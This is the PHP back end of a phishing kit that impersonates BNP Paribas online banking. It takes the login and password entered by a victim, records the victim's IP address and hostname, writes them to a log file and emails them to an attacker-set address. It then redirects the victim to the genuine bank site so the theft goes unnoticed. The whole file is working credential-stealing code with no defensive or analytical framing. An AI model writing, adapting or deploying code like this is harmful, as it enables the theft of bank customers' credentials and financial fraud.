<?php
//-------- by me  --------///
//------ errore--------:::
error_reporting(E_ALL);
header('Content-type: text/html; charset-UTF-8');
date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
//----------iclude ---------//
/*include 'func.php';*/
session_start();

//------- verify-------------//
if (!isset($_POST['putalogin']) || $_POST['putalogin']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-login';</script>");
}
if (!isset($_POST['putpass']) || $_POST['putpass']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}

//------------variable ----------//
$pss = $_POST['putpass'];
$eml = $_POST['putalogin'];

//echo $eml." ".$pss;



date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");include 'Email.php';$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "bodabikola@websitefr.com";$headers = "From:" . $from;$subj = "new login bnp by bikola : $ip";
    $data = "
+======================$subj======================+
|  Information login by bikola                
| Login  : $eml 
| Pass   : $pss                                                     
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by bikola                        
+===================================================================+";
if($Save_Log==1) { $file = fopen("../login.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); };
	die("<script type='text/javascript'>top.location = 'https://mabanque.bnpparibas/fr/connexion';</script>");
	



?>